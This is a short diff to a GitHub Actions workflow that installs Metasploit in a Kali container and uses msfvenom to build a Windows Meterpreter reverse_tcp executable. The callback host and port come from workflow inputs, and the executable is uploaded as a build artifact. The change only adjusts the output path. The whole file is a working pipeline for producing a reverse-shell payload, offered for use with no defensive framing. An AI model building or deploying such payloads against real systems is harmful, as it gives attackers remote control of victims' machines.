@@ -38,7 +38,7 @@ jobs:
             kalilinux/kali-rolling \
             bash -c "apt-get update && \
                      apt-get install -y metasploit-framework && \
-                     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -f exe -o reverse.exe" 
+                     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -f exe -o /output/reverse.exe" 
       
       - name: Upload Payload
         uses: actions/upload-artifact@v4
